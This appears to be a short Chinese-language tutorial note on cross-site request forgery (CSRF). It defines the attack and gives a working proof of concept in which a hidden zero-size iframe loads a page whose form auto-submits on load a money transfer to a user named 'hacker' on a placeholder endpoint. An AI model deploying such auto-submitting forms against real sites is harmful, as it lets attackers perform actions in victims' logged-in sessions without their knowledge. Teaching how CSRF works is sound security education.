---
title: 2-2-2_csrf
date: 2018-05-28 18:56:23
tags:
---

## CSRF

### 概念 
全称 : Cross Site Request forgrey 
中文 : 跨站请求伪造

用途 : 执行恶意操作 （“被转账”，发垃圾评论等），制造蠕虫 ...。

利用用户的已登陆身份，用用户的名义在用户不知情的情况下执行非法操作。

### 原理

默认流程:
```
Request URI: xxx/demo/csrf/transfer.php
cookie:xxxxxxxxxxxxxxxx1
Form:  username:json   amout:10
```
恶意代码

```html
<body>
    <iframe src="csrf-attack.php?t-0.3132353463" width=0 height=0> </iframe>
</body>

```

```php
# csrf-attack.php
<body onload="submitForm();">
    <form id="tip" action="xxx/demo/csrf/transfer.php"  method="post">
    <input type="hidden" name="toUser" value="hacker">
    <input type="hidden" name="amount" value="10">
    </form>
</body>

<script>
    function submitForm(){
        document.getElementById("tip").submit();
    }
</script>

```


